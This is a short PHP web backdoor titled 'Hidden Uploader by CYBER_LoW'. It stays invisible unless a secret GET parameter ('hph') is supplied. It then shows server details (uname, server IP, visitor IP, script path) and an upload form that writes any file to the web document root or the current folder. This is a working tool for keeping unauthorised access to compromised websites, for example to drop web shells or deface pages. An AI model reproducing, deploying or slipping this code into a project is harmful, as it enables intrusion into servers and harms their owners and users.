<?php
echo "
";
if(isset($_GET["hph"])){
echo "
<body bgcolor='grey'><font color='red'>
<center>
<pre>   
Hidden Uploader by CYBER_LoW                        
</pre></font>
<font color='cyan'>".php_uname()."</font><br>
<font color ='gold'>Server IP: </font>
<font color='lime'>".gethostbyname($_SERVER['HTTP_HOST'])." </font>
<font color='gold'>Your IP: </font>
<font color='lime'>".$_SERVER['REMOTE_ADDR']."</font><br>
<font color='gold'>Dir: </font><font color='lime'>".$_SERVER[SCRIPT_FILENAME]."</font>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='idx_file'>
	  <input type='submit' name='upload' value='upload'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "upload success > <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "upload failed in folder root";
		}
	} else {
		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
			echo "upload success <b>$files</b> in this folder";
		} else {
			echo "failed";
		}
	}
}
}
?>